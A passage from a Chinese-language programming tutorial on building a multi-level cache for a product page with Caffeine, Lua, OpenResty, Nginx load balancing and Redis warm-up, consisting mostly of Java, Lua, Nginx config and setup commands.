    private Long total;
    private List<Item> list;

    public PageDTO() {}

    public PageDTO(Long total, List<Item> list) {
        this.total = total;
        this.list = list;
    }
    
}
```

```java
package com.example.item.pojo;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableField;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;

import java.util.Date;

@Data
@TableName("tb_item")
public class Item {
    @TableId(type = IdType.AUTO)
    private Long id;  //商品id
    private String name;  //商品名称
    private String title;  //商品标题
    private Long price;  //价格（分）
    private String image;  //商品图片
    private String category;  //分类名称
    private String brand;  //品牌名称
    private String spec;  //规格
    private Integer status;  //商品状态 1-正常，2-下架
    private Date createTime;  //创建时间
    private Date updateTime;  //更新时间
    @TableField(exist = false)
    private Integer stock;
    @TableField(exist = false)
    private Integer sold;
}
```

```java
package com.example.item.pojo;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;

@Data
@TableName("tb_item_stock")
public class ItemStock {
    
    @TableId(type = IdType.INPUT, value = "item_id")
    private Long id;  // 商品id
    private Integer stock;  // 商品库存
    private Integer sold;  // 商品销量
    
}
```

创建src/main/resources/application.yml：

```yml
server:
  port: 8081
spring:
  application:
    name: itemservice
  datasource:
    url: jdbc:mysql://192.168.150.101:3306/item?useSSL=false
    username: root
    password: root
    driver-class-name: com.mysql.jdbc.Driver
mybatis-plus:
  type-aliases-package: com.example.item.pojo
  configuration:
    map-underscore-to-camel-case: true
  global-config:
    db-config:
      update-strategy: not_null
      id-type: auto
logging:
  level:
    com.heima: debug
  pattern:
    dateformat: HH:mm:ss:SSS
```

启动服务，访问：http://localhost:8081/item/10001即可查询数据。

#### 导入商品查询页面

商品查询是购物页面，与商品管理的页面是分离的。

部署方式如图：

![Nginx反向代理服务器](资源\Nginx反向代理服务器.png)

这里需要准备一个反向代理的Nginx服务器，如上图红框所示，将静态的商品页面放到nginx目录中。

页面需要的数据通过ajax向服务端（Nginx业务集群）查询。

这里已经准备好了Nginx反向代理服务器和静态资源。将[nginx-1.18.0](资源\nginx-1.18.0)拷贝到一个非中文目录下，运行这个Nginx服务，命令：

```sh
start nginx.exe
```

然后访问http://localhost/item.html?id=10001即可。

#### 反向代理

现在，页面是假数据展示的。我们需要向服务器发送ajax请求，查询商品数据。

打开控制台，可以看到页面有发起ajax查询数据。而这个请求地址同样是80端口，所以被当前的Nginx反向代理了。

查看Nginx的conf目录下的nginx.conf文件，其中：

- `upstream nginx-cluster`指定nginx-cluster集群，就是将来的Nginx业务集群（做Nginx本地缓存、Redis缓存、Tomcat查询）。其中的IP地址就是本次演示的虚拟机IP，也就是Nginx业务集群要部署的地方。

  ![Nginx业务集群](资源\Nginx业务集群.png)

- `server.location /api`指定监听`/api`路径，反向代理到nginx-cluster集群。

完整内容如下：

```nginx

#user  nobody;
worker_processes  1;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  application/octet-stream;

    sendfile        on;
    #tcp_nopush     on;
    keepalive_timeout  65;

    upstream nginx-cluster{
        server 192.168.150.101:8081;
    }
    server {
        listen       80;
        server_name  localhost;

	location /api {
            proxy_pass http://nginx-cluster;
        }

        location / {
            root   html;
            index  index.html index.htm;
        }

        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
}
```

### 初识Caffeine

缓存在日常开发中启动至关重要的作用，由于是存储在内存中，数据的读取速度是非常快的，能大量减少对数据库的访问，减少数据库的压力。我们把缓存分为两类：

- 分布式缓存，例如Redis：
  - 优点：存储容量更大、可靠性更好、可以在集群间共享。
  - 缺点：访问缓存有网络开销。
  - 场景：缓存数据量较大、可靠性要求较高、需要在集群间共享。
- 进程本地缓存，例如`HashMap`、GuavaCache：
  - 优点：读取本地内存，没有网络开销，速度更快。
  - 缺点：存储容量有限、可靠性较低、无法共享。
  - 场景：性能要求较高，缓存数据量较小。

我们今天会利用Caffeine框架来实现JVM进程缓存。

[Caffeine](https://github.com/ben-manes/caffeine)是一个基于Java8开发的，提供了近乎最佳命中率的高性能的本地缓存库。目前Spring内部的缓存使用的就是Caffeine。

Caffeine的性能非常好，下图是官方给出的性能对比：

![进程本地缓存性能对比](资源\进程本地缓存性能对比.png)

可以看到Caffeine的性能遥遥领先。

缓存使用的基本API：

```java
package com.example.item.test;

import com.github.benmanes.caffeine.cache.Cache;
import com.github.benmanes.caffeine.cache.Caffeine;
import org.junit.jupiter.api.Test;

import java.time.Duration;

public class CaffeineTest {

    /*
      基本用法测试
     */
    @Test
    void testBasicOps() {
        // 创建缓存对象
        Cache<String, String> cache = Caffeine.newBuilder().build();

        // 存数据
        cache.put("gf", "迪丽热巴");

        // 取数据，不存在则返回null
        String gf = cache.getIfPresent("gf");
        System.out.println("gf = " + gf);

        // 取数据，不存在则去数据库查询
        String defaultGF = cache.get("defaultGF", key -> {
            // 这里可以去数据库根据 key查询value
            return "柳岩";
        });
        System.out.println("defaultGF = " + defaultGF);
    }

    /*
     基于大小设置驱逐策略：
     */
    @Test
    void testEvictByNum() throws InterruptedException {
        // 创建缓存对象
        Cache<String, String> cache = Caffeine.newBuilder()
                // 设置缓存大小上限为 1
                .maximumSize(1)
                .build();
        // 存数据
        cache.put("gf1", "柳岩");
        cache.put("gf2", "范冰冰");
        cache.put("gf3", "迪丽热巴");
        // 延迟10ms，给清理线程一点时间
        Thread.sleep(10L);
        // 获取数据
        System.out.println("gf1: " + cache.getIfPresent("gf1"));
        System.out.println("gf2: " + cache.getIfPresent("gf2"));
        System.out.println("gf3: " + cache.getIfPresent("gf3"));
    }

    /*
     基于时间设置驱逐策略：
     */
    @Test
    void testEvictByTime() throws InterruptedException {
        // 创建缓存对象
        Cache<String, String> cache = Caffeine.newBuilder()
                .expireAfterWrite(Duration.ofSeconds(1)) // 设置缓存有效期为 10 秒
                .build();
        // 存数据
        cache.put("gf", "柳岩");
        // 获取数据
        System.out.println("gf: " + cache.getIfPresent("gf"));
        // 休眠一会儿
        Thread.sleep(1200L);
        System.out.println("gf: " + cache.getIfPresent("gf"));
    }
}
```

Caffeine既然是缓存的一种，肯定需要有缓存的清除策略，不然的话内存总会有耗尽的时候。

Caffeine提供了三种缓存驱逐策略：

- 基于容量：设置缓存的数量上限（内存清理采用LRU策略）

  ```java
  // 创建缓存对象
  Cache<String, String> cache = Caffeine.newBuilder()
      .maximumSize(1) // 设置缓存大小上限为1
      .build();
  ```

- 基于时间：设置缓存的有效时间

  ```java
  // 创建缓存对象
  Cache<String, String> cache = Caffeine.newBuilder()
      // 设置缓存有效期为10秒，从最后一次写入开始计时 
      .expireAfterWrite(Duration.ofSeconds(10)) 
      .build();
  ```
  
- **基于引用**：设置缓存为软引用或弱引用，利用GC来回收缓存数据。性能较差，不建议使用。

注意：在默认情况下，当一个缓存元素过期的时候，Caffeine不会自动立即将其清理和驱逐。而是再一次读或写操作后，或者在空闲时间完成对失效数据的驱逐。

### 实现JVM进程缓存

利用Caffeine实现下列需求：

- 给根据id查询商品的业务添加缓存，缓存未命中时查询数据库。
- 给根据id查询商品库存的业务添加缓存，缓存未命中时查询数据库。
- 缓存初始大小为100。
- 缓存上限为10000。

首先，定义两个Caffeine的缓存对象，分别保存商品、库存的缓存数据。

定义`CaffeineConfig`配置类：

```java
package com.example.item.config;

import com.example.item.pojo.Item;
import com.example.item.pojo.ItemStock;
import com.github.benmanes.caffeine.cache.Cache;
import com.github.benmanes.caffeine.cache.Caffeine;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class CaffeineConfig {

    @Bean
    public Cache<Long, Item> itemCache(){
        return Caffeine.newBuilder()
                .initialCapacity(100)
                .maximumSize(10_000)
                .build();
    }

    @Bean
    public Cache<Long, ItemStock> stockCache(){
        return Caffeine.newBuilder()
                .initialCapacity(100)
                .maximumSize(10_000)
                .build();
    }

}
```

然后，修改`com.example.item.web.ItemController`类，添加缓存逻辑：

```java
import com.github.benmanes.caffeine.cache.Cache;

@Autowired
private Cache<Long, Item> itemCache;
@Autowired
private Cache<Long, ItemStock> stockCache;

@GetMapping("/{id}")
public Item findById(@PathVariable("id") Long id) {
    return itemCache.get(id, key -> itemService.query()
            .ne("status", 3).eq("id", key)
            .one()
    );
}

@GetMapping("/stock/{id}")
public ItemStock findStockById(@PathVariable("id") Long id) {
    return stockCache.get(id, key -> stockService.getById(key));
}
```

分别访问这两个接口并多次查询某个数据。从日志中可以看到，第一次需要查询数据库，后面则不需要。

## Lua语法入门

Nginx编程需要用到Lua语言，因此我们必须先入门Lua的基本语法。

[Lua](https://www.lua.org/)是一种轻量小巧的脚本语言，用标准C语言编写并以源代码形式开放， 其设计目的是为了嵌入应用程序中，从而为应用程序提供灵活的扩展和定制功能。

Lua经常嵌入到C语言开发的程序中，例如游戏开发、游戏插件等。

Nginx本身也是C语言开发，因此也允许基于Lua做拓展。

### HelloWorld

CentOS7默认已经安装了Lua语言环境，所以可以直接运行Lua代码。

- 在Linux虚拟机的任意目录下，新建一个hello.lua文件

  ```sh
  touch hello.lua
  ```

- 添加下面的内容

  ```lua
  print("Hello World!")  -- 字符串也可以使用单引号
  ```

- 运行

  ```sh
  lua hello.lua
  ```

### 变量与循环

学习任何语言必然离不开变量，而变量的声明必须先知道数据的类型。

#### Lua的数据类型

Lua中支持的常见数据类型包括：

| 数据类型   | 描述                                                         |
| ---------- | ------------------------------------------------------------ |
| `nil`      | 这个最简单，只有值`nil`属于该类，表示一个无效值（在条件表达式中相当于`false`）。 |
| `boolean`  | 包含两个值：`false`和`true`                                  |
| `number`   | 表示双精度类型的实浮点数                                     |
| `string`   | 字符串由一对双引号或单引号来表示                             |
| `function` | 由C或Lua编写的函数                                           |
| `table`    | Lua 中的表（table）其实是一个“关联数组”（associative arrays），数组的索引可以是数字、字符串或表类型。在Lua里，table的创建是通过"构造表达式"来完成，最简单构造表达式是`{}`，用来创建一个空表。 |

另外，Lua提供了`type()`函数来判断一个变量的数据类型：

```sh
lua  # 进入lua控制台
print(type("Hello world"))  # 输出string
print(type(10.4*3))  # 输出number
print(type(print))  # 输出function
```

#### 声明变量

Lua声明变量的时候无需指定数据类型，而是用`local`来声明变量为局部变量：

```lua
-- 声明字符串，可以用单引号或双引号，
local str = 'hello'
-- 字符串拼接可以使用 ..
local str2 = 'hello' .. 'world'
-- 声明数字
local num = 21
-- 声明布尔类型
local flag = true
```

Lua中的`table`类型既可以作为数组，又可以作为Java中的`map`来使用。数组就是特殊的`table`，只是键是数组角标而已：

```lua
-- 声明数组，键为索引的table
local arr = {'java', 'python', 'lua'}
-- 声明table，类似java的map
local map =  {name='Jack', age=21}
```

Lua中的数组角标是从1开始，访问的时候与Java中类似：

```lua
-- 访问数组，lua数组的角标从1开始
print(arr[1])
```

Lua中的`table`可以用键来访问：

```lua
-- 访问table
print(map['name'])
print(map.name)
```

#### 循环

对于`table`，我们可以利用`for`循环来遍历。不过数组和普通`table`遍历略有差异：

- 遍历数组：

  ```lua
  -- 声明数组 key为索引的 table
  local arr = {'java', 'python', 'lua'}
  -- 遍历数组
  for index,value in ipairs(arr) do
      print(index, value) 
  end
  ```

- 遍历普通`table`：

  ```lua
  -- 声明map，也就是table
  local map = {name='Jack', age=21}
  -- 遍历table
  for key,value in pairs(map) do
     print(key, value) 
  end
  ```

### 条件控制与函数

Lua中的条件控制和函数声明与Java类似。

#### 函数

定义函数的语法：

```lua
[local] function 函数名(argument1, argument2..., argumentn)
    -- 函数体
    return 返回值
end
```

例如，定义一个函数，用来打印数组：

```lua
function printArr(arr)
    for index, value in ipairs(arr) do
        print(value)
    end
end
```

#### 条件控制

类似Java的条件控制，例如if、else语法：

```lua
if(布尔表达式)
then
   --[ 布尔表达式为 true 时执行该语句块 --]
else
   --[ 布尔表达式为 false 时执行该语句块 --]
end
```

与Java不同，布尔表达式中的逻辑运算是基于英文单词：逻辑与、逻辑或、逻辑非分别表示为`and`、`or`与`not`。

#### 案例

需求：自定义一个函数，可以打印`table`，当参数为`nil`时，打印错误信息

```lua
function printArr(arr)
    if not arr then
        print('数组不能为空！')
    end
    for index, value in ipairs(arr) do
        print(value)
    end
end
```

## 实现多级缓存

多级缓存的实现离不开Nginx编程，而Nginx编程又离不开OpenResty。

### 安装OpenResty

[OpenResty®](https://openresty.org/cn/)是一个基于 Nginx的高性能Web平台，用于方便地搭建能够处理超高并发、扩展性极高的动态Web应用、Web服务和动态网关。具备下列特点：

- 具备Nginx的完整功能。
- 基于Lua语言进行扩展，集成了大量精良的Lua库、第三方模块。
- 允许使用Lua自定义业务逻辑**、**自定义库。

#### 安装开发库

首先要安装OpenResty的依赖开发库，执行命令：

```sh
yum install -y pcre-devel openssl-devel gcc --skip-broken
```

#### 安装OpenResty仓库

你可以在你的 CentOS 系统中添加 `openresty` 仓库，这样就可以便于未来安装或更新我们的软件包（通过 `yum check-update` 命令）。运行下面的命令就可以添加我们的仓库：

```sh
yum-config-manager --add-repo https://openresty.org/package/centos/openresty.repo
```

如果提示说命令不存在，则运行：

```sh
yum install -y yum-utils
```

然后再重复上面的命令。

#### 安装OpenResty

然后就可以像下面这样安装软件包，比如 `openresty`：

```sh
yum install -y openresty
```

#### 安装opm工具

opm是OpenResty的一个管理工具，可以帮助我们安装第三方的Lua模块。

如果你想安装命令行工具 `opm`，那么可以像下面这样安装 `openresty-opm` 包：

```sh
yum install -y openresty-opm
```

#### 目录结构

默认情况下，OpenResty安装的目录是：/usr/local/openresty。

- luajit与lualab是OpenResty提供的第三方模块，例如操作Redis、MySQL的工具模块。

- 看到里面的nginx目录了吗，OpenResty就是在Nginx基础上集成了一些Lua模块。
- bin目录即可执行文件目录，其中openresty文件是链向nginx/sbin/nginx的软链接。

#### 配置Nginx的环境变量

打开配置文件：

```sh
vi /etc/profile
```

在最下面加入两行：

```sh
export NGINX_HOME=/usr/local/openresty/nginx
export PATH=${NGINX_HOME}/sbin:$PATH
```

NGINX_HOME：后面是OpenResty安装目录下的nginx的目录。

然后让配置生效：

```
source /etc/profile
```

#### 启动和运行

OpenResty底层是基于Nginx的，查看OpenResty目录的Nginx目录，结构与windows中安装的nginx基本一致。

所以运行方式与nginx基本一致：

```sh
# 启动nginx
nginx
# 重新加载配置
nginx -s reload
# 停止
nginx -s stop
```

Nginx的默认配置文件注释太多，影响后续我们的编辑，这里将nginx.conf中的注释部分删除，保留有效部分。

修改`/usr/local/openresty/nginx/conf/nginx.conf`文件，内容如下：

```nginx
#user  nobody;
worker_processes  1;
error_log  logs/error.log;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       8081;
        server_name  localhost;
        location / {
            root   html;
            index  index.html index.htm;
        }
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
}
```

在Linux的控制台输入命令以启动nginx：

```sh
nginx
```

然后访问页面：http://192.168.150.101:8081，注意将IP地址替换为你自己的虚拟机IP。

### OpenResty快速入门

我们希望达到的多级缓存架构如图：

![多级缓存架构](资源\多级缓存架构.png)

其中：

- Windows上的Nginx用来做反向代理服务，将前端的查询商品的ajax请求代理到OpenResty集群。

- OpenResty集群用来编写多级缓存业务。

#### 反向代理流程

现在，商品详情页使用的是假的商品数据。不过在浏览器中，可以看到页面有发起ajax请求查询真实商品数据。请求地址是localhost，端口是80，被Windows上安装的Nginx服务给接收到了。然后代理给了OpenResty集群（通过`server.location /api`与`upstream nginx-cluster`配置实现）。因此需要在OpenResty中编写业务，查询商品数据并返回到浏览器。这里先在OpenResty接收请求，返回假的商品数据。

#### OpenResty监听请求

OpenResty的很多功能都依赖于其目录下的Lua库，需要在nginx.conf中指定依赖库的目录，并导入依赖：

- 加载OpenResty的lua模块。修改`/usr/local/openresty/nginx/conf/nginx.conf`文件，在`http`中添加下面代码：

  ```nginx
  # 加载lua模块
  lua_package_path "/usr/local/openresty/lualib/?.lua;;";
  # 加载c模块
  lua_package_cpath "/usr/local/openresty/lualib/?.so;;";  
  ```

- 监听/api/item路径。修改`/usr/local/openresty/nginx/conf/nginx.conf`文件，在`http server`中添加对/api/item这个路径的监听：

  ```nginx
  location  /api/item {
      # 默认的响应类型
      default_type application/json;
      # 响应结果由lua/item.lua文件来决定
      content_by_lua_file lua/item.lua;
  }
  ```

  这个监听，就类似于SpringMVC中的`@GetMapping("/api/item")`做路径映射。而`content_by_lua_file lua/item.lua`则相当于调用item.lua这个文件，执行其中的业务，把结果返回给用户，相当于Java中调用service。

#### 编写item.lua

在`/usr/local/openresty/nginx`目录创建文件夹lua：

```sh
mkdir lua
```

在`/usr/local/openresty/nginx/lua`文件夹下，新建文件item.lua：

```sh
touch lua/item.lua
```

编写item.lua，返回假数据。在item.lua中，利用`ngx.say()`函数返回数据到`Response`中：

```lua
ngx.say('{"id":10001,"name":"SALSA AIR","title":"RIMOWA 21寸托运箱拉杆箱 SALSA AIR系列果绿色 820.70.36.4","price":17900,"image":"https://m.360buyimg.com/mobilecms/s720x720_jfs/t6934/364/1195375010/84676/e9f2c55f/597ece38N0ddcbc77.jpg!q70.jpg.webp","category":"拉杆箱","brand":"RIMOWA","spec":"","status":1,"createTime":"2019-04-30T16:00:00.000+00:00","updateTime":"2019-04-30T16:00:00.000+00:00","stock":2999,"sold":31290}')
```

重新加载配置

```sh
nginx -s reload
```

刷新商品页面：http://localhost/item.html?id=10001（或其他id），即可看到效果。

### 请求参数处理

上一节中，我们在OpenResty接收前端请求，但是返回的是假数据。要返回真实数据，必须根据前端传递来的商品id，查询商品信息。

#### 获取参数的API

OpenResty中提供了一些API用来获取不同类型的前端请求参数：

| 参数格式     | 参数示例       | 参数解析代码示例                                             |
| ------------ | -------------- | ------------------------------------------------------------ |
| 路径占位符   | `/item/1001`   | 正则表达式匹配：`location ~ /item/(\d+) { content_by_lua_file lua/item.lua;}`。匹配到的参数会存入`ngx.var`数组中，可以用下标获取：`local id = ngx.var[1]`。 |
| 请求头       | `id: 1001`     | 获取请求头，返回值是`table`类型：`local headers = ngx.req.get_headers()`。 |
| GET请求参数  | `?id=1001`     | 获取GET请求参数，返回值是`table`类型：`local getParams = ngx.req.get_uri_args()。` |
| POST表单参数 | `id=1001`      | 读取请求体：`ngx.req.read_body()`。获取POST表单参数，返回值是`table`类型：`local postParams = ngx.req.get_post_args()`。 |
| JSON参数     | `{"id": 1001}` | 读取请求体：`ngx.req.read_body()`。 获取body中的JSON参数，返回值是`string`类型：`local jsonBody = ngx.req.get_body_data()`。 |

#### 获取参数并返回

查看前端发起的ajax请求，可以看到商品id是以路径占位符方式传递的，因此可以利用正则表达式匹配的方式来获取ID。

- 获取商品id。修改`/usr/loca/openresty/nginx/conf/nginx.conf`文件中监听/api/item的代码，利用正则表达式获取ID：

  ```nginx
  location ~ /api/item/(\d+) {
      # 默认的响应类型
      default_type application/json;
      # 响应结果由lua/item.lua文件来决定
      content_by_lua_file lua/item.lua;
  }
  ```

- 拼接ID并返回。修改`/usr/loca/openresty/nginx/lua/item.lua`文件，获取id并拼接到结果中返回：

  ```nginx
  # 获取商品id
  local id = ngx.var[1]
  # 拼接并返回
  ngx.say('{"id":' .. id .. ',"name":"SALSA AIR","title":"RIMOWA 21寸托运箱拉杆箱 SALSA AIR系列果绿色 820.70.36.4","price":17900,"image":"https://m.360buyimg.com/mobilecms/s720x720_jfs/t6934/364/1195375010/84676/e9f2c55f/597ece38N0ddcbc77.jpg!q70.jpg.webp","category":"拉杆箱","brand":"RIMOWA","spec":"","status":1,"createTime":"2019-04-30T16:00:00.000+00:00","updateTime":"2019-04-30T16:00:00.000+00:00","stock":2999,"sold":31290}')
  ```

- 重新加载并测试。运行命令以重新加载OpenResty配置：

  ```sh
  nginx -s reload
  ```

  刷新页面，查看请求，可以看到结果中已经带上了id。 

### 查询Tomcat

拿到商品ID后，本应去缓存中查询商品信息，不过目前还未建立Nginx、Redis缓存。因此，这里我们先根据商品id去Tomcat查询商品信息。实现如图：

![查询Tomcat](资源\查询Tomcat.png)

注意，OpenResty在虚拟机上，Tomcat在Windows电脑上。Windows的IP与虚拟机IP的网络号部分一致，将虚拟机IP的主机号改为1，就能映射到Windows IP（前提是关闭Windows防火墙）。

#### 发送HTTP请求的API

Nginx提供了内部API用以发送HTTP请求：

```lua
local resp = ngx.location.capture("/path",{
    method = ngx.HTTP_GET,   -- 请求方式
    args = {a=1,b=2},  -- GET方式传参数
    body = "c=3&d=4"  -- 或者：POST方式传参数
})
```

返回的响应内容包括：

- `resp.status`：响应状态码。
- `resp.header`：响应头，是一个`table`。
- `resp.body`：响应体，就是响应数据。

注意：这里的`path`是路径，并不包含IP和端口。这个请求会被Nginx内部的`server`监听并处理。

要想将这个请求发送到Tomcat服务器，还需要编写一个`server`来对这个路径做反向代理：

```nginx
location /path {
    # 这里是Windows电脑的IP和Java服务端口，需要确保Windows防火墙处于关闭状态
    proxy_pass http://192.168.150.1:8081; 
}
```

`ngx.location.capture`发起的请求会被反向代理到Windows上的Java服务器的IP与端口，因此最终的请求为：`GET http:192.168.150.1:8081/path?a=3&b=4`。

#### 封装HTTP工具

下面，我们封装一个发送HTTP请求的工具，基于`ngx.location.capture`来实现查询Tomcat。

添加反向代理到Windows的Java服务。因为item-service中的接口都是`/item`开头，所以要监听`/item`路径，代理到Windows上的Tomcat服务。修改 `/usr/local/openresty/nginx/conf/nginx.conf`文件，添加一个`location`：

```nginx
location /item {
    proxy_pass http://192.168.150.1:8081;
}
```

以后，只要调用`ngx.location.capture("/item")`，就一定能发送请求到Windows的Tomcat服务。

因为之前加载了lua模块与C模块，因此自定义的HTTP工具也需要放到对应的/usr/local/openresty/lualib目录下从而被加载。在该目录下创建一个common.lua文件：

```sh
vi /usr/local/openresty/lualib/common.lua
```

内容如下:

```lua
-- 封装函数，发送http请求，并解析响应
local function read_http(path, params)
    local resp = ngx.location.capture(path,{
        method = ngx.HTTP_GET,
        args = params,
    })
    if not resp then
        -- 记录错误信息，返回404
        ngx.log(ngx.ERR, "http请求查询失败, path: ", path , ", args: ", args)
        ngx.exit(404)
    end
    return resp.body
end
-- 将方法导出
local _M = {  
    read_http = read_http
}  
return _M
```

这个工具将`read_http`函数封装到`_M`这个`table`类型的变量中并返回，这类似于导出。使用的时候，可以利用`require('common')`来导入该函数库，这里的`common`是函数库的文件名。

实现商品查询：修改/usr/local/openresty/lua/item.lua文件，利用刚刚封装的函数库实现对Tomcat的查询：

```lua
-- 引入自定义common工具模块，返回值是common中返回的 _M
local common = require("common")
-- 从 common中获取read_http这个函数
local read_http = common.read_http
-- 获取路径参数
local id = ngx.var[1]
-- 根据id查询商品
local itemJSON = read_http("/item/".. id, nil)
-- 根据id查询商品库存
local itemStockJSON = read_http("/item/stock/".. id, nil)
```

这里查询到的结果是JSON字符串，并且包含商品、库存两个JSON字符串，页面最终需要的是把两个JSON拼接为一个JSON。这就需要先把JSON变为lua的`table`，完成数据整合后，再转为JSON。

#### CJSON工具类

OpenResty提供了一个[cjson](https://github.com/openresty/lua-cjson/)模块用来处理JSON的序列化和反序列化。

引入cjson模块（该模块在/usr/local/openresty/lualib目录下）：

```lua
local cjson = require "cjson"
```

序列化：

```lua
local obj = {
    name = 'jack',
    age = 21
}
-- 把 table 序列化为 json
local json = cjson.encode(obj)
```

反序列化：

```lua
local json = '{"name": "jack", "age": 21}'
-- 反序列化 json为 table
local obj = cjson.decode(json);
print(obj.name)
```

#### 实现Tomcat查询

下面修改之前的item.lua中的业务，添加JSON处理功能：

```lua
-- 导入common函数库
local common = require('common')
local read_http = common.read_http
-- 导入cjson库
local cjson = require('cjson')

-- 获取路径参数
local id = ngx.var[1]
-- 根据id查询商品
local itemJSON = read_http("/item/".. id, nil)
-- 根据id查询商品库存
local stockJSON = read_http("/item/stock/".. id, nil)

-- JSON转化为lua的table
local item = cjson.decode(itemJSON)
local stock = cjson.decode(stockJSON)

-- 组合数据
item.stock = stock.stock
item.sold = stock.sold

-- 把item序列化为json返回结果
ngx.say(cjson.encode(item))
```

访问http://localhost/item.html，所有的item都可以正常显示了。

#### 基于ID负载均衡

以上实现的是单机部署的Tomcat。而实际开发中，Tomcat一定是集群模式。因此，OpenResty需要对Tomcat集群做负载均衡。

![Tomcat负载均衡](资源\Tomcat负载均衡.png)

默认的负载均衡规则是轮询模式，当查询`/item/10001`时：

- 第一次会访问8081端口的Tomcat服务，在该服务内部就形成了JVM进程缓存。
- 第二次会访问8082端口的Tomcat服务，该服务内部没有JVM缓存（因为JVM缓存无法共享），会查询数据库。
- ...

因为轮询的原因，第一次查询8081形成的JVM缓存并未生效，直到下一次再次访问到8081时才可以生效，缓存命中率太低了（同时有冗余存储）。如果能让同一个商品，每次查询时都访问同一个tomcat服务，那么JVM缓存就一定能生效了。也就是说，需要根据商品id做负载均衡，而不是轮询。

Nginx提供了基于请求路径做负载均衡的算法。Nginx根据请求路径做哈希运算，把得到的数值对Tomcat服务的数量取余，余数是几，就访问第几个服务，实现负载均衡。例如：假设请求路径是`/item/10001`，Tomcat总数为2（端口分别为8081、8082），对请求路径`/item/1001`做哈希运算求余的结果为1，则访问第一个Tomcat服务，也就是8081。只要id不变，每次哈希运算结果也不会变，那就可以保证同一个商品，一直访问同一个Tomcat服务，确保JVM缓存生效。

修改/usr/local/openresty/nginx/conf/nginx.conf文件，实现基于ID做负载均衡。

首先，定义Tomcat集群，并设置基于路径做负载均衡：

```nginx 
upstream tomcat-cluster {
    hash $request_uri;
    server 192.168.150.1:8081;
    server 192.168.150.1:8082;
}
```

然后，修改对tomcat服务的反向代理，目标指向tomcat集群：

```nginx
location /item {
    proxy_pass http://tomcat-cluster;
}
```

重新加载OpenResty

```sh
nginx -s reload
```

同时启动两台Tomcat服务，第一台的端口为8081，第二台的端口为8082（通过指定VM options：`-Dserver.port=8082`）。清空日志后，再次访问页面，可以看到不同id的商品，访问到了不同的Tomcat服务。

### Redis缓存预热

Redis缓存会面临**冷启动**问题：服务刚刚启动时，Redis中并没有缓存，如果所有商品数据都在第一次查询时添加缓存，可能会给数据库带来较大压力。

**缓存预热**：在实际开发中，我们可以利用大数据统计用户访问的热点数据，在项目启动时将这些热点数据提前查询并保存到Redis中。

由于本项目数据量较少，并且没有数据统计相关功能，目前可以在启动时将所有数据都放入缓存中。

利用Docker安装Redis：

```sh
docker run --name redis -p 6379:6379 -d redis redis-server --appendonly yes
```

在item-service服务中引入Redis依赖：

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-redis</artifactId>
</dependency>
```

在src/main/resources/application.yml文件中配置Redis地址：

```yaml
spring:
  redis:
    host: 192.168.150.101
```

编写初始化类。缓存预热需要在项目启动时完成，并且必须是拿到`RedisTemplate`之后。这里利用`InitializingBean`接口来实现，因为`InitializingBean`可以在对象被Spring创建并且成员变量全部注入后执行：

```java
package com.example.item.config;

import com.example.item.pojo.Item;
import com.example.item.pojo.ItemStock;
import com.example.item.service.IItemService;
import com.example.item.service.IItemStockService;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Component;

import java.util.List;

@Component
public class RedisHandler implements InitializingBean {

    @Autowired
    private StringRedisTemplate redisTemplate;

    @Autowired
    private IItemService itemService;

    @Autowired
    private IItemStockService stockService;

    private static final ObjectMapper MAPPER = new ObjectMapper();

    @Override
    public void afterPropertiesSet() throws Exception {
        // 查询商品信息
        List<Item> itemList = itemService.list();
        // 放入缓存
        for (Item item : itemList) {
            // item序列化为JSON
            String json = MAPPER.writeValueAsString(item);
            // 存入Redis
            redisTemplate.opsForValue().set("item:id:" + item.getId(), json);
        }

        // 查询商品库存信息
        List<ItemStock> stockList = stockService.list();
        // 放入缓存
        for (ItemStock stock : stockList) {
            // item序列化为JSON
            String json = MAPPER.writeValueAsString(stock);
            // 存入Redis
            redisTemplate.opsForValue().set("item:stock:id:" + stock.getId(), json);
        }
    }
}
```

### 查询Redis缓存

现在，Redis缓存已经准备就绪，可以在OpenResty中实现查询Redis的逻辑了。如下图红框所示：

![查询Redis缓存](资源\查询Redis缓存.png)

当请求进入OpenResty之后，优先查询Redis缓存，如果Redis缓存未命中，再查询Tomcat。

#### 封装Redis工具

OpenResty提供了操作Redis的模块，只要引入该模块就能直接使用。为了方便，这里将Redis操作封装到之前的common.lua工具库中。

修改/usr/local/openresty/lualib/common.lua文件：

- 引入Redis模块，并初始化Redis对象：

  ```lua
  -- 引入redis模块（位于resty目录下的redis.lua）
  local redis = require('resty.redis')
  -- 初始化Redis对象
  local red = redis:new()
  -- 设置Redis超时时间（建立连接的超时时间、发送请求的超时时间、响应结果的超时时间，单位为毫秒）
  red:set_timeouts(1000, 1000, 1000)
  ```

- 封装函数，用来释放Redis连接，其实是放入连接池：

  ```lua
  -- 关闭redis连接的工具方法，其实是放入连接池
  local function close_redis(red)
      local pool_max_idle_time = 10000  -- 连接的空闲时间，单位是毫秒
      local pool_size = 100  --连接池大小
      local ok, err = red:set_keepalive(pool_max_idle_time, pool_size)  -- ok表示结果，err表示异常消息
      if not ok then  -- 结果为nil
          ngx.log(ngx.ERR, "放入redis连接池失败: ", err)
      end
  end
  ```

- 封装函数，根据键查询Redis数据：

  ```lua
  -- 查询redis的方法，ip和port是Redis地址，key是查询的键
  local function read_redis(ip, port, key)
      -- 获取一个连接
      local ok, err = red:connect(ip, port)
      if not ok then
          ngx.log(ngx.ERR, "连接redis失败 : ", err)
          return nil
      end
      -- 查询redis
      local resp, err = red:get(key)
      -- 查询失败处理
      if not resp then
